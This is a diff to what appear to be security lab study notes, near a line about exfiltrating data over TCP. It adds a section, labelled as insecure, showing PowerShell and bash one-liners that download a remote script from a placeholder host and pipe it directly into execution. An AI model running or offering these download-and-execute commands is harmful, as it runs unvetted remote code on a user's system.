@@ -51,3 +51,12 @@ Exfiltrate data over TCP using data encoding. 
 - unzip
    - ```tar xvf task4-creds.tar```
 
+### Cool But Insecure Way To Execute Scripts
+
+Powershell
+
+    iwr -useb https://something.com/psscript.ps1 | iex
+
+Bash
+
+    curl https://something.com/psscript.ps1 | sh
